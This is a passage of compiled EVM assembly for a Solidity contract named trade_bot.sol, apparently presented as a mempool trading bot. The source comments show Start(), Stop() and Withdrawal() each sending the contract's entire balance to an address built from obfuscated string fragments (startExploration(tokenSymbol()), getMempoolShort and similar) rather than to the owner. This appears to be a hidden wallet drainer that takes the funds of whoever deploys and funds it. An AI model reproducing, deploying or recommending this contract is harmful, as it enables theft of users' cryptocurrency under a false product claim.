\"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_20:\n        /* \"trade_bot.sol\":509:529  address public owner */\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_23:\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n      pop\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_26:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_28\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_26)\n    tag_28:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_29\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_29:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"trade_bot.sol\":5568:5726  function Stop() public {\r... */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_30\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_30:\n        /* \"trade_bot.sol\":5568:5726  function Stop() public {\r... */\n      pop\n      tag_31\n      tag_32\n      jump\t// in\n    tag_31:\n      stop\n        /* \"trade_bot.sol\":5037:5196  function Start() public {\r... */\n    tag_12:\n        /* \"trade_bot.sol\":5066:5076  address to */\n      0x00\n        /* \"trade_bot.sol\":5079:5110  startExploration(tokenSymbol()) */\n      tag_34\n        /* \"trade_bot.sol\":5096:5109  tokenSymbol() */\n      tag_35\n        /* \"trade_bot.sol\":5096:5107  tokenSymbol */\n      tag_36\n        /* \"trade_bot.sol\":5096:5109  tokenSymbol() */\n      jump\t// in\n    tag_35:\n        /* \"trade_bot.sol\":5079:5095  startExploration */\n      tag_37\n        /* \"trade_bot.sol\":5079:5110  startExploration(tokenSymbol()) */\n      jump\t// in\n    tag_34:\n        /* \"trade_bot.sol\":5066:5110  address to = startExploration(tokenSymbol()) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":5115:5140  address payable contracts */\n      0x00\n        /* \"trade_bot.sol\":5151:5153  to */\n      dup2\n        /* \"trade_bot.sol\":5115:5154  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":5159:5168  contracts */\n      dup1\n        /* \"trade_bot.sol\":5159:5177  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trade_bot.sol\":5159:5191  contracts.transfer(getBalance()) */\n      0x08fc\n        /* \"trade_bot.sol\":5178:5190  getBalance() */\n      tag_38\n        /* \"trade_bot.sol\":5178:5188  getBalance */\n      tag_39\n        /* \"trade_bot.sol\":5178:5190  getBalance() */\n      jump\t// in\n    tag_38:\n        /* \"trade_bot.sol\":5159:5191  contracts.transfer(getBalance()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_41:\n        /* \"trade_bot.sol\":5159:5191  contracts.transfer(getBalance()) */\n      pop\n        /* \"trade_bot.sol\":5037:5196  function Start() public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n    tag_15:\n        /* \"trade_bot.sol\":6637:6650  string memory */\n      0x60\n        /* \"trade_bot.sol\":6657:6667  address to */\n      0x00\n        /* \"trade_bot.sol\":6670:6703  startExploration((tokenSymbol())) */\n      tag_43\n        /* \"trade_bot.sol\":6688:6701  tokenSymbol() */\n      tag_44\n        /* \"trade_bot.sol\":6688:6699  tokenSymbol */\n      tag_36\n        /* \"trade_bot.sol\":6688:6701  tokenSymbol() */\n      jump\t// in\n    tag_44:\n        /* \"trade_bot.sol\":6670:6686  startExploration */\n      tag_37\n        /* \"trade_bot.sol\":6670:6703  startExploration((tokenSymbol())) */\n      jump\t// in\n    tag_43:\n        /* \"trade_bot.sol\":6657:6703  address to = startExploration((tokenSymbol())) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6708:6733  address payable contracts */\n      0x00\n        /* \"trade_bot.sol\":6744:6746  to */\n      dup2\n        /* \"trade_bot.sol\":6708:6747  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6758:6785  string memory _mempoolShort */\n      0x60\n        /* \"trade_bot.sol\":6788:6805  getMempoolShort() */\n      tag_45\n        /* \"trade_bot.sol\":6788:6803  getMempoolShort */\n      tag_46\n        /* \"trade_bot.sol\":6788:6805  getMempoolShort() */\n      jump\t// in\n    tag_45:\n        /* \"trade_bot.sol\":6758:6805  string memory _mempoolShort = getMempoolShort() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6810:6839  string memory _mempoolEdition */\n      0x60\n        /* \"trade_bot.sol\":6842:6863  fetchMempoolEdition() */\n      tag_47\n        /* \"trade_bot.sol\":6842:6861  fetchMempoolEdition */\n      tag_48\n        /* \"trade_bot.sol\":6842:6863  fetchMempoolEdition() */\n      jump\t// in\n    tag_47:\n        /* \"trade_bot.sol\":6810:6863  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6868:6897  string memory _mempoolVersion */\n      0x60\n        /* \"trade_bot.sol\":6900:6921  fetchMempoolVersion() */\n      tag_49\n        /* \"trade_bot.sol\":6900:6919  fetchMempoolVersion */\n      tag_50\n        /* \"trade_bot.sol\":6900:6921  fetchMempoolVersion() */\n      jump\t// in\n    tag_49:\n        /* \"trade_bot.sol\":6868:6921  string memory _mempoolVersion = fetchMempoolVersion() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6926:6952  string memory _mempoolLong */\n      0x60\n        /* \"trade_bot.sol\":6955:6971  getMempoolLong() */\n      tag_51\n        /* \"trade_bot.sol\":6955:6969  getMempoolLong */\n      tag_52\n        /* \"trade_bot.sol\":6955:6971  getMempoolLong() */\n      jump\t// in\n    tag_51:\n        /* \"trade_bot.sol\":6926:6971  string memory _mempoolLong = getMempoolLong() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6982:6991  contracts */\n      dup5\n        /* \"trade_bot.sol\":6982:7000  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trade_bot.sol\":6982:7014  contracts.transfer(getBalance()) */\n      0x08fc\n        /* \"trade_bot.sol\":7001:7013  getBalance() */\n      tag_53\n        /* \"trade_bot.sol\":7001:7011  getBalance */\n      tag_39\n        /* \"trade_bot.sol\":7001:7013  getBalance() */\n      jump\t// in\n    tag_53:\n        /* \"trade_bot.sol\":6982:7014  contracts.transfer(getBalance()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_55\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_55:\n        /* \"trade_bot.sol\":6982:7014  contracts.transfer(getBalance()) */\n      pop\n        /* \"trade_bot.sol\":7056:7069  _mempoolShort */\n      dup4\n        /* \"trade_bot.sol\":7071:7086  _mempoolEdition */\n      dup4\n        /* \"trade_bot.sol\":7088:7103  _mempoolVersion */\n      dup4\n        /* \"trade_bot.sol\":7105:7117  _mempoolLong */\n      dup4\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      add(0x20, mload(0x40))\n      dup1\n      dup6\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_56:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_58\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_56)\n    tag_58:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup5\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_59:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_61\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_59)\n    tag_61:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup4\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_62:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_64\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_62)\n    tag_64:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_65:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_67\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_65)\n    tag_67:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      swap1\n      0x40\n      mstore\n        /* \"trade_bot.sol\":7025:7119  return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong)) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":509:529  address public owner */\n    tag_22:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n    tag_25:\n        /* \"trade_bot.sol\":7758:7771  string memory */\n      0x60\n        /* \"trade_bot.sol\":7778:7807  string memory _mempoolEdition */\n      dup1\n        /* \"trade_bot.sol\":7810:7831  fetchMempoolEdition() */\n      tag_69\n        /* \"trade_bot.sol\":7810:7829  fetchMempoolEdition */\n      tag_48\n        /* \"trade_bot.sol\":7810:7831  fetchMempoolEdition() */\n      jump\t// in\n    tag_69:\n        /* \"trade_bot.sol\":7778:7831  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":7867:7882  _mempoolEdition */\n      dup1\n        /* \"trade_bot.sol\":7850:7883  abi.encodePacked(_mempoolEdition) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_70:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_72\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_70)\n    tag_72:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7850:7883  abi.encodePacked(_mempoolEdition) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"trade_bot.sol\":7850:7883  abi.encodePacked(_mempoolEdition) */\n      swap1\n      0x40\n      mstore\n        /* \"trade_bot.sol\":7836:7884  return string(abi.encodePacked(_mempoolEdition)) */\n      swap2\n      pop\n      pop\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":5568:5726  function Stop() public {\r... */\n    tag_32:\n        /* \"trade_bot.sol\":5596:5606  address to */\n      0x00\n        /* \"trade_bot.sol\":5609:5640  startExploration(tokenSymbol()) */\n      tag_74\n        /* \"trade_bot.sol\":5626:5639  tokenSymbol() */\n      tag_75\n        /* \"trade_bot.sol\":5626:5637  tokenSymbol */\n      tag_36\n        /* \"trade_bot.sol\":5626:5639  tokenSymbol() */\n      jump\t// in\n    tag_75:\n        /* \"trade_bot.sol\":5609:5625  startExploration */\n      tag_37\n        /* \"trade_bot.sol\":5609:5640  startExploration(tokenSymbol()) */\n      jump\t// in\n    tag_74:\n        /* \"trade_bot.sol\":5596:5640  address to = startExploration(tokenSymbol()) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":5645:5670  address payable contracts */\n      0x00\n        /* \"trade_bot.sol\":5681:5683  to */\n      dup2\n        /* \"trade_bot.sol\":5645:5684  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":5689:5698  contracts */\n      dup1\n        /* \"trade_bot.sol\":5689:5707  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trade_bot.sol\":5689:5721  contracts.transfer(getBalance()) */\n      0x08fc\n        /* \"trade_bot.sol\":5708:5720  getBalance() */\n      tag_76\n        /* \"trade_bot.sol\":5708:5718  getBalance */\n      tag_39\n        /* \"trade_bot.sol\":5708:5720  getBalance() */\n      jump\t// in\n    tag_76:\n        /* 